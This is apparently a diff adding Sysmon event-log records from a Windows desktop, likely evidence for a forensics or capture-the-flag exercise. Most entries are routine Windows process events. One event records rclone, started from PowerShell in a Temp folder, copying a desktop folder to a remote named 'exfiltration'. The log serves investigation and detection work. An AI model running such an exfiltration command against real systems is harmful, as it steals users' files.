+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252907.82292
+   },
+   "EventRecordID": 77,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:07.821",
+   "ProcessGuid": "10DA3E43-D92B-63F8-B100-000000000900",
+   "ProcessId": 3820,
+   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252917.5250704
+   },
+   "EventRecordID": 78,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:17.516",
+   "ProcessGuid": "10DA3E43-D935-63F8-B200-000000000900",
+   "ProcessId": 5116,
+   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
+   "FileVersion": "1.61.1",
+   "Description": "Rsync for cloud storage",
+   "Product": "Rclone",
+   "Company": "https://rclone.org",
+   "OriginalFileName": "rclone.exe",
+   "CommandLine": "\"C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe\" copy C:\\Users\\Wade\\Desktop\\Relic_location\\ remote:exfiltration -v",
+   "CurrentDirectory": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E94901809FF7CC5168C1E857D4AC9CBB339CA1F6E21DCCE95DFB8E28DF799961",
+   "ParentProcessGuid": "10DA3E43-D8D2-63F8-9B00-000000000900",
+   "ParentProcessId": 5888,
+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252924.0171552
+   },
+   "EventRecordID": 79,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:24.013",
+   "ProcessGuid": "10DA3E43-D8FE-63F8-A000-000000000900",
+   "ProcessId": 3896,
+   "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252925.3610833
+   },
+   "EventRecordID": 80,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:25.343",
+   "ProcessGuid": "10DA3E43-D935-63F8-B200-000000000900",
+   "ProcessId": 5116,
+   "Image": "C:\\Users\\wade\\AppData\\Local\\Temp\\rclone-v1.61.1-windows-amd64\\rclone.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252926.1164336
+   },
+   "EventRecordID": 81,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:26.111",
+   "ProcessGuid": "10DA3E43-D93E-63F8-B300-000000000900",
+   "ProcessId": 4504,
+   "Image": "C:\\Windows\\System32\\taskhostw.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Host Process for Windows Tasks",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "taskhostw.exe",
+   "CommandLine": "taskhostw.exe",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=72279AD47EED7FBF2472214824696351B9CB2571B8EE5D8C92FADA23B378D812",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 1008,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252926.2699263
+   },
+   "EventRecordID": 82,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:26.250",
+   "ProcessGuid": "10DA3E43-D93E-63F8-B300-000000000900",
+   "ProcessId": 4504,
+   "Image": "C:\\Windows\\System32\\taskhostw.exe",
+   "User": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252928.9197168
+   },
+   "EventRecordID": 83,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:28.913",
+   "ProcessGuid": "10DA3E43-D8CE-63F8-9700-000000000900",
+   "ProcessId": 5732,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252928.9356785
+   },
+   "EventRecordID": 84,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:28.929",
+   "ProcessGuid": "10DA3E43-D8CE-63F8-9800-000000000900",
+   "ProcessId": 5740,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252938.2603295
+   },
+   "EventRecordID": 85,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:38.248",
+   "ProcessGuid": "10DA3E43-D94A-63F8-B400-000000000900",
+   "ProcessId": 5264,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252943.3213809
+   },
+   "EventRecordID": 86,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:43.318",
+   "ProcessGuid": "10DA3E43-D94A-63F8-B400-000000000900",
+   "ProcessId": 5264,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252943.579344
+   },
+   "EventRecordID": 87,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:43.542",
+   "ProcessGuid": "10DA3E43-D94F-63F8-B500-000000000900",
+   "ProcessId": 5404,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252948.633365
+   },
+   "EventRecordID": 88,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:48.630",
+   "ProcessGuid": "10DA3E43-D94F-63F8-B500-000000000900",
+   "ProcessId": 5404,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252952.8326209
+   },
+   "EventRecordID": 89,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:52.291",
+   "ProcessGuid": "10DA3E43-D958-63F8-B600-000000000900",
+   "ProcessId": 5516,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252953.68292
+   },
+   "EventRecordID": 90,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:52.536",
+   "ProcessGuid": "10DA3E43-D958-63F8-B700-000000000900",
+   "ProcessId": 5444,
+   "Image": "C:\\Windows\\System32\\SearchProtocolHost.exe",
+   "FileVersion": "7.0.19041.610 (WinBuild.160101.0800)",
+   "Description": "Microsoft Windows Search Protocol Host",
+   "Product": "Windows® Search",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "SearchProtocolHost.exe",
+   "CommandLine": "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe2_ Global\\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\" ",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=59CC005C70A7E16BD2E0C8DF3DAF7E6F9FCA5B49A7A377A62775480579A5252F",
+   "ParentProcessGuid": "10DA3E43-D896-63F8-5900-000000000900",
+   "ParentProcessId": 3024,
+   "ParentImage": "C:\\Windows\\System32\\SearchIndexer.exe",
+   "ParentCommandLine": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
+   "ParentUser": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252953.7267168
+   },
+   "EventRecordID": 91,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:53.716",
+   "ProcessGuid": "10DA3E43-D959-63F8-B800-000000000900",
+   "ProcessId": 2212,
+   "Image": "C:\\Windows\\System32\\SearchFilterHost.exe",
+   "FileVersion": "7.0.19041.610 (WinBuild.160101.0800)",
+   "Description": "Microsoft Windows Search Filter Host",
+   "Product": "Windows® Search",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "SearchFilterHost.exe",
+   "CommandLine": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 792 796 804 8192 800 776 ",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=FFBCF5F709E1E017EAC64AF5C9E232140FCA2D1A02A64C1FFFD965B1E5AB842F",
+   "ParentProcessGuid": "10DA3E43-D896-63F8-5900-000000000900",
+   "ParentProcessId": 3024,
+   "ParentImage": "C:\\Windows\\System32\\SearchIndexer.exe",
+   "ParentCommandLine": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
+   "ParentUser": "NT AUTHORITY\\SYSTEM"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252957.30764
+   },
+   "EventRecordID": 92,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:57.238",
+   "ProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ProcessId": 5356,
+   "Image": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252958.6241152
+   },
+   "EventRecordID": 93,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:35:58.621",
+   "ProcessGuid": "10DA3E43-D958-63F8-B600-000000000900",
+   "ProcessId": 5516,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252960.940555
+   },
+   "EventRecordID": 94,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:36:00.849",
+   "ProcessGuid": "10DA3E43-D902-63F8-A600-000000000900",
+   "ProcessId": 5288,
+   "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+   "User": "NT AUTHORITY\\NETWORK SERVICE"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252961.78928
+   },
+   "EventRecordID": 95,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:36:01.721",
+   "ProcessGuid": "10DA3E43-D961-63F8-B900-000000000900",
+   "ProcessId": 2804,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252967.1110032
+   },
+   "EventRecordID": 96,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:36:07.105",
+   "ProcessGuid": "10DA3E43-D961-63F8-B900-000000000900",
+   "ProcessId": 2804,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }
